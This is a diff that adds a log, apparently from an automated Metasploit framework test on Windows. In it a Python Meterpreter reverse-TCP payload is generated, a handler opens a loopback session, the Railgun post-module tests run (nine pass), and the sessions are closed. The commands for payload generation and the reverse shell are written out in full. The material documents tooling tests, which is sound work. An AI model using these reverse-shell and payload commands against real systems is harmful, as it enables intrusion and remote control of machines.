@@ -1,0 +1,36 @@
+use python/meterpreter_reverse_tcp
+irb -e '(self.respond_to?(:framework) ? framework : self).datastore.user_defined.clear'
+setg SessionTlvLogging file:D:/a/_temp/pythonmeterpreter_reverse_tcp_session_tlv_logging20231026-5252-frzghctxt
+msf6 payload(python/meterpreter_reverse_tcp) > msf6 payload(python/meterpreter_reverse_tcp) > SessionTlvLogging => file:D:/a/_temp/pythonmeterpreter_reverse_tcp_session_tlv_logging20231026-5252-frzghctxt
+msf6 payload(python/meterpreter_reverse_tcp) > generate -o D:/a/_temp/child-process-rb-python-meterpreter-reverse-tcp20231026-5252-mz76xz.py -f raw AutoVerifySessionTimeout=30 lport=6008 lhost=127.0.0.1 MeterpreterDebugLogging=rpath:D:/a/_temp/pythonmeterpreter_reverse_tcp_debug_log20231026-5252-ce6ujwtxt MeterpreterTryToFork=false PythonMeterpreterDebug=true
+[*] Writing 24928 bytes to D:/a/_temp/child-process-rb-python-meterpreter-reverse-tcp20231026-5252-mz76xz.py...
+msf6 payload(python/meterpreter_reverse_tcp) > to_handler
+[*] Payload Handler Started as Job 7
+msf6 payload(python/meterpreter_reverse_tcp) > 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6008 
+[*] Meterpreter session 8 opened (127.0.0.1:6008 -> 127.0.0.1:50107) at 2023-10-26 19:04:53 +0000
+use test/railgun
+msf6 post(test/railgun) > run session=8 AddEntropy=true Verbose=true
+[!] SESSION may not be compatible with this module:
+[!]  * missing Meterpreter features: stdapi_fs_chmod
+[*] Running against session 8
+[*] Session type is meterpreter and platform is windows
+[*] SKIPPED: def test_api_function_calls_libc (target is not linux or osx)
+[+] Should retrieve the win32k file version
+[+] Should include error information in the results
+[+] Should support functions with no parameters
+[+] Should support functions with literal parameters
+[+] Should support functions with in/out/inout parameter types
+[+] Should support calling multiple functions at once
+[+] Should support writing memory
+[+] Should support reading memory
+[*] Testing complete in 0.39 seconds
+[*] Passed: 9; Failed: 0; Skipped: 1
+[*] Post module execution completed
+msf6 post(test/railgun) > sessions -K
+jobs -K
+[*] Killing all sessions...
+[*] 127.0.0.1 - Meterpreter session 8 closed.
+msf6 post(test/railgun) > Stopping all jobs...
+msf6 post(test/railgun) > 
